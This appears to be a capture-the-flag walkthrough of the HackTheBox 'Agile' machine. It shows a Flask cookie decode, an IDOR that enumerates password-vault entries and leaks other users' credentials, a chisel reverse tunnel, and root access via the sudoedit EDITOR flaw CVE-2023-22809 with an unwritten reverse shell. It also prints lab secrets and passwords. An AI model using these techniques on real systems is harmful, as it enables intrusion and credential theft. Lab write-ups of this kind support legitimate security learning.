---
cover: ../.gitbook/assets/image (7).png
coverY: 0
---

# \[Medium] Agile

## **Info**

<table><thead><tr><th>Name</th><th>Info</th><th data-hidden></th></tr></thead><tbody><tr><td>IP</td><td><mark style="color:blue;">10.129.171.197</mark></td><td></td></tr><tr><td>Domain</td><td><mark style="color:blue;">superpass.htb</mark></td><td></td></tr></tbody></table>

## **Services**

{% code overflow="wrap" %}
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f4bcee21d71f1aa26572212d5ba6f700 (ECDSA)
|_  256 65c1480d88cbb975a02ca5e6377e5106 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: SuperPassword \xF0\x9F\xA6\xB8
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{% endcode %}

## Web

### Main page

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

### **Leaked app path**

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

### Inside registred account

<figure><img src="../.gitbook/assets/image (6) (4).png" alt=""><figcaption></figcaption></figure>

### **Cookies**

| Name                                               | Value                                                                                                                                                                                                                                                                                                                                 |
| -------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| <mark style="color:purple;">session</mark>         | <mark style="color:green;">.eJwlTstqwzAQ\_BWx51D03LX8Fb2XECTtbmxwm2A5p5B\_r0Iu82CGYZ5w0a30RTrMP08wxyD4ld7LVeAE35uULma7Xc36Z46bKa2N0BzL2s19dL7g\_DqfxsgufYH52B8y3MowQ6KEEjIiUuVqWaY2CbmQSaLn5skm61wiV1UQw8SJSTB7bVEHop9ysrEmW7W5xOwapeLfEyw8FAblXDlE1UpZyKKWFjgGFziT9eP-5dFl\_7xxHl7\_E01GcA.ZAe8xQ.eeKuZVIyfmAdiMrKjGNYJ04gVtk</mark> |
| <mark style="color:purple;">remember\_token</mark> | <mark style="color:green;">12\|a7304ebbb81e83ee62f07550bdac6acb5b315624abbb84dcc1b7435dae353413a59a4f70034c9469acd4d2a0d5ff2cd45be790de047fce0bf168471d90f66aab</mark>                                                                                                                                                                |



### Cookies-Unsign

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask#flask-unsign" %}

```bash
flask-unsign --decode --cookie '$COOKIE'
```

After cookie decode:

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

### Intercepting traffic from website

After a time, I found out that HTTP request when we changing password entry seems to be interesting. (endpoint:  <mark style="color:red;">/vault/edit\_row/\<ID></mark> )

GET request:

```http
GET /vault/edit_row/1 HTTP/1.1
Host: superpass.htb
HX-Request: true
HX-Current-URL: http://superpass.htb/vault
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept: */*
Referer: http://superpass.htb/vault
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: remember_token=12|a7304ebbb81e83ee62f07550bdac6acb5b315624abbb84dcc1b7435dae353413a59a4f70034c9469acd4d2a0d5ff2cd45be790de047fce0bf168471d90f66aab; session=.eJwlTstqwzAQ_BWx51D03LX8Fb2XECTtbmxwm2A5p5B_r0Iu82CGYZ5w0a30RTrMP08wxyD4ld7LVeAE35uULma7Xc36Z46bKa2N0BzL2s19dL7g_DqfxsgufYH52B8y3MowQ6KEEjIiUuVqWaY2CbmQSaLn5skm61wiV1UQw8SJSTB7bVEHop9ysrEmW7W5xOwapeLfEyw8FAblXDlE1UpZyKKWFjgGFziT9eP-5dFl_7xxHl7_E01GcA.ZAe8xQ.eeKuZVIyfmAdiMrKjGNYJ04gVtk
Connection: close
```

&#x20;Response:

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 07 Mar 2023 23:36:49 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Content-Length: 619

<tr>
    <td>
        
        <a hx-post="/vault/add_row" 
            hx-include="closest tr"
            hx-trigger="click, keydown[key=='Enter'] from:closest tr">
            <i class="fas fa-save"></i>
        </a>
        <i _="on click hide closest <tr/>
              on keydown[key=='Escape'] from closest <tr/> hide closest <tr/>" class="fa-solid fa-trash"></i></a>
        
    </td>
    <td><input type="text" name="url" placeholder=" site"  /></td>
    <td><input type="text" name="username" placeholder=" username"  /></td>
    <td><input type="text" name="password" placeholder=" password"  /></td>
</tr>
```

We can bruteforce ID endpoint to leak entries of other users. After some time, found some interesting creds:

**ID = **<mark style="color:blue;">**4**</mark>**:**

<pre class="language-http"><code class="lang-http">HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 07 Mar 2023 23:31:20 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Content-Length: 682

<strong>&#x3C;tr>
</strong>    &#x3C;td>
        
        &#x3C;a hx-post="/vault/update/4" 
            hx-include="closest tr"
            hx-trigger="click, keydown[key=='Enter'] from:closest tr">
            &#x3C;i class="fas fa-save">&#x3C;/i>
        &#x3C;/a>
        &#x3C;a hx-get="/vault/row/4" 
            hx-trigger="click, keydown[key=='Escape'] from:closest tr">
            &#x3C;i class="fas fa-undo">&#x3C;/i>
        &#x3C;/a>
        
    &#x3C;/td>
    &#x3C;td>&#x3C;input type="text" name="url" placeholder=" site" value="mgoblog.com" />&#x3C;/td>
    &#x3C;td>&#x3C;input type="text" name="username" placeholder=" username" value="0xdf" />&#x3C;/td>
    &#x3C;td>&#x3C;input type="text" name="password" placeholder=" password" value="5b133f7a6a1c180646cb" />&#x3C;/td>
&#x3C;/tr>
</code></pre>

**ID = **<mark style="color:blue;">**3**</mark>**:**

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 07 Mar 2023 23:39:46 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Content-Length: 685

<tr>
    <td>
        
        <a hx-post="/vault/update/3" 
            hx-include="closest tr"
            hx-trigger="click, keydown[key=='Enter'] from:closest tr">
            <i class="fas fa-save"></i>
        </a>
        <a hx-get="/vault/row/3" 
            hx-trigger="click, keydown[key=='Escape'] from:closest tr">
            <i class="fas fa-undo"></i>
        </a>
        
    </td>
    <td><input type="text" name="url" placeholder=" site" value="hackthebox.com" /></td>
    <td><input type="text" name="username" placeholder=" username" value="0xdf" /></td>
    <td><input type="text" name="password" placeholder=" password" value="762b430d32eea2f12970" /></td>
</tr>    
```

**ID = **<mark style="color:blue;">**7**</mark>**:**

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 07 Mar 2023 23:41:40 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Content-Length: 684

<tr>
    <td>
        
        <a hx-post="/vault/update/7" 
            hx-include="closest tr"
            hx-trigger="click, keydown[key=='Enter'] from:closest tr">
            <i class="fas fa-save"></i>
        </a>
        <a hx-get="/vault/row/7" 
            hx-trigger="click, keydown[key=='Escape'] from:closest tr">
            <i class="fas fa-undo"></i>
        </a>
        
    </td>
    <td><input type="text" name="url" placeholder=" site" value="ticketmaster" /></td>
    <td><input type="text" name="username" placeholder=" username" value="corum" /></td>
    <td><input type="text" name="password" placeholder=" password" value="9799588839ed0f98c211" /></td>
</tr>
```



**ID = **<mark style="color:blue;">**8**</mark>**:**&#x20;

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 07 Mar 2023 23:44:21 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Content-Length: 677

<tr>
    <td>
        
        <a hx-post="/vault/update/8" 
            hx-include="closest tr"
            hx-trigger="click, keydown[key=='Enter'] from:closest tr">
            <i class="fas fa-save"></i>
        </a>
        <a hx-get="/vault/row/8" 
            hx-trigger="click, keydown[key=='Escape'] from:closest tr">
            <i class="fas fa-undo"></i>
        </a>
        
    </td>
    <td><input type="text" name="url" placeholder=" site" value="agile" /></td>
    <td><input type="text" name="username" placeholder=" username" value="corum" /></td>
    <td><input type="text" name="password" placeholder=" password" value="5db7caa1d13cc37c9fc2" /></td>
</tr>
```



Connect via SSH using last creds and got user flag:

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

## Privelege Escalation

### corum -> edwards





**`pspy:pspypspзы`**

```
2023/03/08 00:30:03 CMD: UID=1000  PID=47016  | ./.tml 
2023/03/08 00:30:03 CMD: UID=0     PID=46921  | 
2023/03/08 00:30:03 CMD: UID=1001  PID=46864  | /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=46807 --lang=en-US --enable-automation --enable-logging --log-level=0 --remote-debugging-port=41829 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --enable-blink-features=ShadowDOMV0 --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-ticks-at-unix-epoch=-1678141883168056 --launch-time-ticks=93099753533 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,5474068424469613215,1626258377424788536,131072 --disable-features=PaintHolding 
2023/03/08 00:30:03 CMD: UID=1001  PID=46835  | /opt/google/chrome/chrome --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --enable-logging --log-level=0 --use-angle=swiftshader-webgl --use-gl=angle --headless --crashpad-handler-pid=46807 --enable-logging --log-level=0 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,5474068424469613215,1626258377424788536,131072 --disable-features=PaintHolding --enable-crash-reporter 
2023/03/08 00:30:03 CMD: UID=1001  PID=46831  | /opt/google/chrome/chrome --type=gpu-process --enable-logging --headless --log-level=0 --ozone-platform=headless --use-angle=swiftshader-webgl --headless --crashpad-handler-pid=46807 --gpu-preferences=WAAAAAAAAAAgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --use-gl=angle --use-angle=swiftshader-webgl --enable-logging --log-level=0 --shared-files --field-trial-handle=0,i,5474068424469613215,1626258377424788536,131072 --disable-features=PaintHolding 
2023/03/08 00:30:03 CMD: UID=1001  PID=46815  | /opt/google/chrome/chrome --type=zygote --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=46807 --enable-crash-reporter 
2023/03/08 00:30:03 CMD: UID=1001  PID=46813  | /opt/google/chrome/chrome --type=zygote --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=46807 --enable-crash-reporter 
2023/03/08 00:30:03 CMD: UID=1001  PID=46812  | /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --enable-logging --headless --log-level=0 --headless --crashpad-handler-pid=46807 --enable-crash-reporter 
2023/03/08 00:30:03 CMD: UID=1001  PID=46807  | /opt/google/chrome/chrome_crashpad_handler --monitor-self-annotation=ptype=crashpad-handler --database=/tmp --url=https://clients2.google.com/cr/report --annotation=channel= --annotation=lsb-release=Ubuntu 22.04.2 LTS --annotation=plat=Linux --annotation=prod=Chrome_Headless --annotation=ver=108.0.5359.94 --initial-client-fd=6 --shared-client-connection 
2023/03/08 00:30:03 CMD: UID=1001  PID=46805  | cat 
2023/03/08 00:30:03 CMD: UID=1001  PID=46804  | cat 
2023/03/08 00:30:03 CMD: UID=1001  PID=46800  | /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-gpu --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-blink-features=ShadowDOMV0 --enable-logging --headless --log-level=0 --no-first-run --no-service-autorun --password-store=basic --remote-debugging-port=41829 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.com.google.Chrome.gT131b --window-size=1420,1080 data:, 
2023/03/08 00:30:03 CMD: UID=1001  PID=46794  | chromedriver --port=49923 
2023/03/08 00:30:03 CMD: UID=1001  PID=46793  | /app/venv/bin/python3 /app/venv/bin/pytest -x 
2023/03/08 00:30:03 CMD: UID=1001  PID=46787  | /bin/bash /app/test_and_update.sh 
2023/03/08 00:30:03 CMD: UID=1001  PID=46786  | /bin/sh -c /app/test_and_update.sh 
2023/03/08 00:30:03 CMD: UID=0     PID=46785  | /usr/sbin/CRON -f -P 
2023/03/08 00:30:03 CMD: UID=0     PID=46783  | 
2023/03/08 00:30:03 CMD: UID=0     PID=46682  | 
2023/03/08 00:30:03 CMD: UID=0     PID=46456  | 
2023/03/08 00:30:03 CMD: UID=0     PID=46362  | 
2023/03/08 00:30:03 CMD: UID=0     PID=46319  | 
2023/03/08 00:30:03 CMD: UID=0     PID=46033  | 
2023/03/08 00:30:03 CMD: UID=1000  PID=45675  | -bash 
2023/03/08 00:30:03 CMD: UID=1000  PID=45667  | sshd: corum@pts/0    
2023/03/08 00:30:03 CMD: UID=1000  PID=45642  | (sd-pam) 
2023/03/08 00:30:03 CMD: UID=1000  PID=45641  | /lib/systemd/systemd --user 
2023/03/08 00:30:03 CMD: UID=0     PID=45638  | sshd: corum [priv]   
2023/03/08 00:30:03 CMD: UID=0     PID=44003  | 
2023/03/08 00:30:03 CMD: UID=1001  PID=1073   | /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5555 wsgi-dev:app 
2023/03/08 00:30:03 CMD: UID=1001  PID=1071   | /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5555 wsgi-dev:app 
2023/03/08 00:30:03 CMD: UID=33    PID=1070   | /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5000 --threads=10 --timeout 600 wsgi:app 
2023/03/08 00:30:03 CMD: UID=33    PID=1068   | /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5000 --threads=10 --timeout 600 wsgi:app 
2023/03/08 00:30:03 CMD: UID=109   PID=1020   | /usr/sbin/mysqld 
2023/03/08 00:30:03 CMD: UID=33    PID=1017   | nginx: worker process                            
2023/03/08 00:30:03 CMD: UID=33    PID=1016   | nginx: worker process                            
2023/03/08 00:30:03 CMD: UID=0     PID=1015   | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; 
2023/03/08 00:30:03 CMD: UID=0     PID=1010   | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2023/03/08 00:30:03 CMD: UID=0     PID=1001   | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2023/03/08 00:30:03 CMD: UID=0     PID=988    | /usr/sbin/cron -f -P 
2023/03/08 00:30:03 CMD: UID=0     PID=835    | /lib/systemd/systemd-logind 
2023/03/08 00:30:03 CMD: UID=0     PID=832    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
2023/03/08 00:30:03 CMD: UID=103   PID=829    | @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2023/03/08 00:30:03 CMD: UID=0     PID=755    | /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 
2023/03/08 00:30:03 CMD: UID=0     PID=753    | 
2023/03/08 00:30:03 CMD: UID=102   PID=621    | /lib/systemd/systemd-resolved 
2023/03/08 00:30:03 CMD: UID=101   PID=597    | /lib/systemd/systemd-networkd 
2023/03/08 00:30:03 CMD: UID=999   PID=567    | /usr/local/sbin/laurel --config /etc/laurel/config.toml 
2023/03/08 00:30:03 CMD: UID=0     PID=566    | /usr/bin/vmtoolsd 
2023/03/08 00:30:03 CMD: UID=0     PID=564    | /sbin/auditd 
2023/03/08 00:30:03 CMD: UID=0     PID=563    | /usr/bin/VGAuthService 
2023/03/08 00:30:03 CMD: UID=104   PID=561    | /lib/systemd/systemd-timesyncd 
2023/03/08 00:30:03 CMD: UID=0     PID=532    | /lib/systemd/systemd-udevd 
2023/03/08 00:30:03 CMD: UID=0     PID=527    | /sbin/multipathd -d -s 
2023/03/08 00:30:03 CMD: UID=0     PID=526    | 
2023/03/08 00:30:03 CMD: UID=0     PID=525    | 
2023/03/08 00:30:03 CMD: UID=0     PID=524    | 
2023/03/08 00:30:03 CMD: UID=0     PID=519    | 
2023/03/08 00:30:03 CMD: UID=0     PID=485    | /lib/systemd/systemd-journald 
2023/03/08 00:30:03 CMD: UID=0     PID=438    | 
2023/03/08 00:30:03 CMD: UID=0     PID=2      | 
2023/03/08 00:30:03 CMD: UID=0     PID=1      | /sbin/init 
2023/03/08 00:31:01 CMD: UID=0     PID=47026  | /usr/sbin/CRON -f -P 
2023/03/08 00:31:01 CMD: UID=0     PID=47025  | /usr/sbin/CRON -f -P 
2023/03/08 00:31:01 CMD: UID=0     PID=47027  | /usr/sbin/CRON -f -P 
2023/03/08 00:31:01 CMD: UID=0     PID=47028  | /usr/sbin/CRON -f -P 
2023/03/08 00:31:01 CMD: UID=1001  PID=47029  | /bin/sh -c /app/test_and_update.sh 
2023/03/08 00:31:01 CMD: UID=1001  PID=47030  | date 
2023/03/08 00:31:01 CMD: UID=1001  PID=47033  | /bin/bash /app/test_and_update.sh 
2023/03/08 00:31:01 CMD: UID=1001  PID=47032  | /bin/bash /app/test_and_update.sh 
2023/03/08 00:31:01 CMD: UID=1001  PID=47031  | ps auxww 

```

**app.py**

```python
import json
import os
import sys
import flask
import jinja_partials
from flask_login import LoginManager
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from superpass.infrastructure.view_modifiers import response
from superpass.data import db_session

app = flask.Flask(__name__)
app.config['SECRET_KEY'] = 'MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD'


def register_blueprints():
    from superpass.views import home_views
    from superpass.views import vault_views
    from superpass.views import account_views
    
    app.register_blueprint(home_views.blueprint)
    app.register_blueprint(vault_views.blueprint)
    app.register_blueprint(account_views.blueprint)


def setup_db():
    db_session.global_init(app.config['SQL_URI'])


def configure_login_manager():
    login_manager = LoginManager()
    login_manager.login_view = 'account.login_get'
    login_manager.init_app(app)

    from superpass.data.user import User

    @login_manager.user_loader
    def load_user(user_id):
        from superpass.services.user_service import get_user_by_id
        return get_user_by_id(user_id)


def configure_template_options():
    jinja_partials.register_extensions(app)
    helpers = {
        'len': len,
        'str': str,
        'type': type,
    }
    app.jinja_env.globals.update(**helpers)


def load_config():
    config_path = os.getenv("CONFIG_PATH")
    with open(config_path, 'r') as f:
        for k, v in json.load(f).items():
            app.config[k] = v


def configure():
    load_config()
    register_blueprints()
    configure_login_manager()
    setup_db()
    configure_template_options()


def enable_debug():
    from werkzeug.debug import DebuggedApplication
    app.wsgi_app = DebuggedApplication(app.wsgi_app, True)
    app.debug = True


def main():
    enable_debug()
    configure()
    app.run(debug=True)


def dev():
    configure()
    app.run(port=5555)


if __name__ == '__main__':
    main()
else:
    configure()

```

Also, exploring the pspy output, I noticed that testbuild of application runned on 5555th port.

So, I decided to use port forwarding to see what I can obtain.

```
corum@agile:~/.tmp$ ./chisel client 10.10.16.21:12312 R:5555:127.0.0.1:5555
```

<pre><code><strong>[Tools] > ./chisel server -p 12312 --reverse
</strong>2023/03/08 05:25:50 server: Reverse tunnelling enabled
2023/03/08 05:25:50 server: Fingerprint ME854sDqMSy83mZxvdLEIcXs+ESnXNN76Zd84GU6qCw=
2023/03/08 05:25:50 server: Listening on http://0.0.0.0:12312
2023/03/08 05:25:58 server: session#1: tun: proxy#R:5555=>5555: Listening

</code></pre>

<figure><img src="../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>

And found SSH creds for edwards:

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

```
agile edwards d07867c6267dcb5df0af
```

### sudo -l

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

<pre class="language-json"><code class="lang-json">/var/tmp/config_test.json                                                  

{
<strong>    "SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"
</strong>}

-----

MYSQL_LOGIN : superpasstester
MYSQL_PASS  : VUO8A2c2#3FnLq3*a9DX1U
</code></pre>

```
sudoedit /app/app-testing/tests/functional/creds.txt

```



**We have sudo version 1.9.9 which is vulnerable to CVE-2023-22809.**

{% embed url="https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc" %}

{% embed url="https://www.rapid7.com/db/vulnerabilities/suse-cve-2023-22809/" %}

**Exploit:**&#x20;

```
export EDITOR="vim -p */any file, that can lead to PE/*"
sudoedit *file*
```

In our case it's gonna be look like:&#x20;

```
export EDITOR="vim -p /app/venv/bin/activate"
export EDITOR="vim -- /app/venv/bin/activate"
```



Add revshell to `activate` and get root.

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

